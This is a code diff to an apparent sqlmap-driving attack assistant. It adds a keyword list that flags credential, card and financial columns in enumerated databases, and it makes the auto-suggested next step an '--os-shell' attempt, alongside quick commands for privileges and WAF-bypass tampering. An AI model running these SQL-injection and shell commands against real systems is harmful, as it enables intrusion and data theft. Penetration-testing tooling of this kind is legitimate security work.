@@ -50,6 +50,8 @@ function execCmd(cmd) {
 //  Central state for all SQLi tracking data
 // ======================================================================
 
+const SENSITIVE_PATTERNS = ['password', 'pass', 'pwd', 'card', 'api', 'token', 'secret', 'key', 'ssn', 'email', 'credit', 'balance', 'amount', 'auth'];
+
 const STATE = {
   // Current target URL being tested
   targetUrl: '',
@@ -69,6 +71,9 @@ const STATE = {
 
   // Discovered columns per table: Map<"db.table", string[]>
   columns: new Map(),
+
+  // Set of sensitive columns found: Set<"db.table.column">
+  sensitiveColumns: new Set(),
 
   // Current workflow phase
   // 'idle' | 'detecting' | 'detected' | 'enumerating-dbs' | 'enumerating-tables' |
@@ -95,6 +100,7 @@ function resetState() {
   STATE.databases = [];
   STATE.tables.clear();
   STATE.columns.clear();
+  STATE.sensitiveColumns.clear();
   STATE.phase = 'idle';
   STATE.lastCommand = '';
   bump();
@@ -298,6 +304,19 @@ function parseSqlmapLine(line) {
       if (!cols.includes(col)) {
         cols.push(col);
         STATE.columns.set(key, cols);
+
+        // Check for sensitive patterns
+        const lowerCol = col.toLowerCase();
+        if (SENSITIVE_PATTERNS.some(p => lowerCol.includes(p))) {
+          STATE.sensitiveColumns.add(key + '.' + col);
+
+          // Notify HUD
+          const recon = getRecon();
+          if (recon.hud) {
+            recon.hud.notify(`Sensitive column found: ${col} in ${key}`, 'warn');
+          }
+        }
+
         bump();
       }
     }
@@ -434,8 +453,16 @@ function suggestNextCommand() {
     }
   }
 
-  // Fallback: if we have vulnerable params, suggest dbs
+  // Fallback: if we have vulnerable params, suggest dbs or shell
   if (vulnParams.length > 0) {
+    // Prioritize high impact RCE checks if not just attempted
+    if (!STATE.lastCommand.includes('--os-shell') && !STATE.lastCommand.includes('--sql-shell')) {
+      return {
+        label: 'Attempt OS Shell',
+        cmd: 'sqlmap -u ' + safeUrl + ' --os-shell --batch',
+      };
+    }
+
     return {
       label: 'Enumerate databases',
       cmd: 'sqlmap -u ' + safeUrl + ' --dbs --batch',
@@ -458,6 +485,7 @@ function getQuickCommands() {
     { label: 'Test URL', icon: '\u25B6', cmd: 'sqlmap -u ' + safeUrl + ' --batch', color: '#58a6ff' },
     { label: 'Aggressive', icon: '\u26A1', cmd: 'sqlmap -u ' + safeUrl + ' --level=5 --risk=3 --batch', color: '#f0883e' },
     { label: 'Enum DBs', icon: '\u26C1', cmd: 'sqlmap -u ' + safeUrl + ' --dbs --batch', color: '#56d364' },
+    { label: 'Privileges', icon: '\uD83D\uDC51', cmd: 'sqlmap -u ' + safeUrl + ' --privileges --batch', color: '#d29922' },
     { label: 'OS Shell', icon: '\u2318', cmd: 'sqlmap -u ' + safeUrl + ' --os-shell', color: '#da3633' },
     { label: 'WAF Bypass', icon: '\u2694', cmd: 'sqlmap -u ' + safeUrl + ' --tamper=space2comment,between --random-agent', color: '#bc8cff' },
     { label: 'Forms', icon: '\u2611', cmd: 'sqlmap -u ' + safeUrl + ' --forms --batch --crawl=2', color: '#79c0ff' },
@@ -890,20 +918,22 @@ function renderHudTab(React) {
           key: 'col-list-' + key,
           style: { display: 'flex', flexWrap: 'wrap', gap: '4px', marginTop: '2px' }
         },
-          ...cols.map(col =>
-            h('span', {
+          ...cols.map(col => {
+            const isSensitive = STATE.sensitiveColumns.has(key + '.' + col);
+            return h('span', {
               key: 'col-' + key + '-' + col,
               style: {
-                background: '#161b22',
-                border: '1px solid #21262d',
+                background: isSensitive ? '#da363322' : '#161b22',
+                border: '1px solid ' + (isSensitive ? '#da3633' : '#21262d'),
                 borderRadius: '4px',
                 padding: '2px 6px',
                 fontFamily: 'monospace',
                 fontSize: '10px',
-                color: '#79c0ff',
+                color: isSensitive ? '#f85149' : '#79c0ff',
+                fontWeight: isSensitive ? 700 : 400,
               },
-            }, col)
-          )
+            }, col);
+          })
         )
       );
     }
